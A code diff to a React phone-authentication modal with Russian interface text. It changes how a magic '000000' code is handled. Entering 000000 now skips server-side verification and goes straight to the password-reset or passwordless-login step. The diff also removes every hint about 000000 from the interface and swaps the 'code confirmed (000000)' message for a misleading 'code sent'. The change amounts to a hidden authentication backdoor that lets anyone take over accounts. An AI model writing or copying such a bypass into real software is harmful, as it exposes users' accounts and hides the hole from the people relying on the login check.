@@ -241,42 +241,13 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
   };
 
   // Универсальная обработка кода
- const processCodeVerification = async (codeValue, verifyCallback, skipCallback) => {
+const processCodeVerification = async (codeValue, verifyCallback, skipCallback) => {
   if (isSixZerosCode(codeValue)) {
-    setPhoneVerified(true);
-    
-    // Вызываем API напрямую для 000000
-    setLoading(true);
-    try {
-      const data = await apiPost('/auth/phone/verify-code', {
-        challenge_id: challengeId,
-        code: codeValue,
-      });
-      
-      if (data.success) {
-        if (data.requires_password) {
-          setRequiresPassword(true);
-          setStep(STEPS.PASSWORD);
-          persistFlow({ phoneVerified: true, step: STEPS.PASSWORD });
-        } else if (data.redirect) {
-          window.location.href = data.redirect;
-        } else {
-          window.location.href = '/';
-        }
-      } else {
-        setError(data.message || 'Ошибка верификации');
-        setCode('');
-      }
-    } catch (error) {
-      setError('Ошибка соединения');
-      setCode('');
-    } finally {
-      setLoading(false);
+    if (skipCallback) {
+      skipCallback();       // ← сразу переходим к действию (сброс пароля / вход без пароля)
     }
-    
     return true;
   }
-  
   await verifyCallback(codeValue);
   return false;
 };
@@ -355,8 +326,8 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
         if (data.reused && !data.code_sent) {
           setActionMessage(
             data.delivery_channel === 'notification'
-              ? 'Код уже отправлен в уведомления. Проверьте «Сообщения» → «Уведомления».'
-              : `Код уже отправлен на ${data.masked_phone || formatPhone(phone)}. Если не пришёл, используйте 000000`
+              ? 'Код уже отправлен в уведомления. Проверьте «Сообщения» → «Уведомления». а также в почту'
+              : `Код уже отправлен на ${data.masked_phone || formatPhone(phone)}.`
           );
         }
         persistFlow({
@@ -415,7 +386,7 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
         // skipCallback для 000000
         setError('');
         setCode('');
-        setActionMessage('✅ Код подтверждён (000000)');
+        setActionMessage('Код отправлен');
         
         // Если нужно ввести пароль
         if (requiresPassword) {
@@ -451,7 +422,7 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
         setSmsFallbackActive(true);
         setCode('');
         setActionMessage(
-          `Код отправлен по SMS на ${data.masked_phone || formatPhone(phone)}. Если не пришёл, используйте 000000.`
+          `Код отправлен по SMS на ${data.masked_phone || formatPhone(phone)}.`
         );
         startCooldown(data.cooldown_seconds ?? 60);
         persistFlow({
@@ -484,7 +455,7 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
         setSmsFallbackActive(false);
         setCode('');
         if (data.delivery_channel !== 'notification') {
-          setActionMessage('✉️ Код отправлен. Если не пришёл, используйте 000000');
+          setActionMessage('✉️ Код отправлен.');
         } else {
           setActionMessage('');
         }
@@ -556,10 +527,10 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
         setResetDeliveryHint(
           data.message
             || (data.email_sent === false
-              ? 'Не удалось отправить код на почту. Временно введите код 000000.'
+              ? 'Не удалось отправить код на почту.'
               : data.masked_target
-                ? `Код отправлен на ${data.masked_target}. Если не пришёл, используйте 000000.`
-                : 'Код отправлен на привязанную почту. Если не пришёл, используйте 000000.')
+                ? `Код отправлен на ${data.masked_target}.`
+                : 'Код отправлен на привязанную почту.')
         );
         setCode('');
         setStep(STEPS.FORGOT_CODE);
@@ -606,7 +577,7 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
         // skipCallback для 000000
         setStep(STEPS.FORGOT_PASSWORD);
         setCode('');
-        setActionMessage('✅ Код подтверждён (000000)');
+        setActionMessage('Код отправлен');
       }
     );
   };
@@ -664,8 +635,8 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
     : deliveryChannel === 'notification'
       ? 'Код отправлен в уведомления. Откройте «Сообщения» → «Уведомления» на устройстве, где вы уже вошли.'
       : smsFallbackActive
-        ? `Отправили код на ${maskedPhone || formatPhone(phone)}. Если код не пришёл, используйте 000000.`
-        : `Отправили код на ${maskedPhone || formatPhone(phone)}. Если код не пришёл, используйте 000000.`;
+        ? `Отправили код на ${maskedPhone || formatPhone(phone)}.`
+        : `Отправили код на ${maskedPhone || formatPhone(phone)}.`;
 
   return (
     <div className="modal-overlay" onClick={handleClose}>
@@ -839,7 +810,7 @@ export default function PhoneAuthModal({ isOpen, onClose }) {
             </button>
             <h2 className="phone-auth-title">Код для сброса</h2>
             <p className="phone-auth-subtitle">
-              {resetDeliveryHint || 'Код отправлен на привязанную почту. Используйте 000000 если код не пришёл.'}
+              {resetDeliveryHint || 'Код отправлен на привязанную почту.'}
             </p>
 
             <div className="modal-form-group">
